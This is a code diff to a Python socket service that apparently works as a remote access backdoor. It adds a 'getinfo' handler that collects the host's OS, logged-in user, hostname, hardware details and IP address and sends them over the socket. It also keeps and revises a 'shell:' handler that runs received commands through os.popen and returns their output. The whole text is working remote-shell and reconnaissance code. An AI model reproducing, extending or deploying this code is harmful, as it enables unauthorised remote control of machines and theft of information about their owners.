@@ -32,9 +32,16 @@ def socket_service():
                 break
 
             if client_message == 'getinfo':
-                os_name = os.name
-                os_login = os.getlogin()
-                host_name = socket.gethostname()
+                os_name = " OS Name: "+os.name
+                os_login = " Login User: " + os.getlogin()
+                host_name = " Host Name: "+socket.gethostname()
+                machine = " Platform Machine: "+platform.machine()
+                processor = " Processor: "+platform.processor()
+                ip = " IP: "+socket.gethostbyname(socket.gethostname())
+
+                information = '\n'+os_name + '\n' + os_login + "\n" + host_name +"\n"+machine+"\n"+processor+"\n"+ip+"\n"
+
+                http_socket.send(information.encode())
 
 
             if client_message.startswith("shell:"):
@@ -54,9 +61,9 @@ def socket_service():
                         http_socket.send("cd: "+cd_path+" error!")
                     continue
                 else:
-                    run = os.popen("cd "+run_path+" & "+shell,"r")
-                    run_result = run.read()
-                    http_socket.send(bytes(run_result.encode()))
+                    run = os.popen("cd "+run_path+" & "+shell)
+                    #o = open(os.environ['HOME']+"/command_run_log.log")
+                    http_socket.send(bytes(run.read().encode()))
 
             else:
                 http_socket.send(bytes("send command error".encode()))
